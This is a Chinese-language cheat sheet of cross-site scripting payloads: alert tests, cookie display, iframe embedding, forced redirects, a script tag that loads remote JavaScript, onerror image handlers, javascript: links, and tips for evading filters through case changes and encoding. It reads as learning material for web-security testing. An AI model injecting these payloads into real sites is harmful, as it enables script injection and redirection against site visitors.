## 构造XSS脚本

### HTML

```html
<iframe></iframe>
<testarea></testarea>
<image></image>
<script src=''></script>
<script type=''></script>
```

### JavaScript

```javascript
alert()				alert()方法用于显示带有一条指定消息和一个确认按钮的警告框
window.location		window.location对象用于获得当前页面的地址URL，并把浏览器重定向到新的页面
location.href		返回当前显示文档的完整URL
onload				在一张页面或一幅图像完成加载的时候触发
onsubmit			在确认按钮被点击的时候触发
onerror				在加载文档或图像发生错误时触发
```

### 构造XSS脚本

```html
<!-- 弹窗警告，测试漏洞 -->
<script>alert('xss')</script>
<script>alert(document.cookie)</script>
<!-- 页面嵌套 -->
<iframe src="https://www.baidu.com" width=300 height=300 border=0></iframe>
<!-- 页面重定向 -->
<script>window.location="https://www.baidu.com"</script>
<script>location.href="https://www.baidu.com"</script>
<script>alert("请移步到我们的新站");location.href="https://www.baidu.com"</script>
<!-- 访问恶意代码 -->
<script src='http://www.my.com/xss.js'></script>
<image src="#" onerror=alert('xss')></image> <!-- <img> ? -->
<image src="javascript:alert('xss');"></image>
<img src=ssss.ss onerror=alert(1)>
<image src="http://a.b.com/xss.js"></image>
<!--
大小写绕开过滤
改变编码：URL, Base64等
-->
<!-- 超链接,可以转码 -->
<a href="javascript:alert('xss')">yanrui</a>
```

